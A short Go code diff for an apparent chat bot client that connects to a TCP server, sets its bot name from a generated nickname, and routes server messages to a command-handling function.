@@ -1,9 +1,9 @@
 package main
 
 import (
+	botclientcommand "BotClientCommand"
 	misc "Misc"
 	"bufio"
-	"fmt"
 	"net"
 	"os"
 )
@@ -31,9 +31,9 @@ func initClientConn(netType string, addr string, port string) {
 }
 
 func handleClientConn(c net.Conn) {
-	_, err := c.Write([]byte(">setbotname jhon"))
+	_, err := c.Write([]byte(">setbotname " + botclientcommand.Getnick()))
 	if err != nil {
-		return
+		// return
 	}
 	for {
 		buf := make([]byte, 500)
@@ -43,9 +43,9 @@ func handleClientConn(c net.Conn) {
 		}
 		data := string(buf[0:nr])
 		if data == "Name Taken" {
-			_, err = c.Write([]byte(">setbotname meron"))
+			_, err = c.Write([]byte(">setbotname " + botclientcommand.Getnick()))
 		}
-		fmt.Println(">server", data)
+		botclientcommand.HandleCommand(c, data)
 	}
 }
 
